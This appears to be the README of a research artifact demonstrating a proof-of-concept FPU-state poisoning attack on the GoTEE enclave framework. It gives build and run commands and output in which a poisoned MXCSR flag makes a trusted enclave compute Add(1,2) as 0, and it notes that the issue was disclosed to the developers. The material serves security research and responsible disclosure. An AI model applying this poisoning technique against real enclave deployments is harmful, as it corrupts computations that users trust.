# Proof of concept attack on GoTEE

## Install GoTEE

```bash
$ sudo apt-get -yqq install golang
$ cd gotee-fpu
$ go get github.com/aghosn/serializer
$ PATH=$PATH:$HOME/go/bin
$ sudo make
```

**Note (Artifact).** This step was already executed on the lab machine for the ACSAC '20 artifact submission.

## Build and run example attack enclave

We provide a hello-world sample that executes a print from both the untrusted and trusted domains.

Example output showcasing an example run with and without FPU poisoning in an
untrusted domain and enclave, respectively. Notice the faulty result for
`VADDPD` when poisoning the denormals-as-zero MXCSR flag:

```
$ PATH=$PATH:$HOME/go/bin
$ cd example/hello-world/
$ make
$ ./main
From an untrusted domain:
Hello World!
[ENTRY] Control Word: 0x37f
[ENTRY] MXCSR: 0x1fa0

Add(1,2) is 3
[EXIT] Control Word: 0x37f
[EXIT] MXCSR: 0x1fa2
--
From a trusted domain:
Hello World!
[ENTRY] Control Word: 0x1f7f
[ENTRY] MXCSR: 0x1fe0

Add(1,2) is 0
[EXIT] Control Word: 0x1f7f
[EXIT] MXCSR: 0x1fe0
```

## Disclosure and mitigation

We reported this issue to the GoTEE developers in <https://github.com/epfl-dcsl/gotee/issues/3> .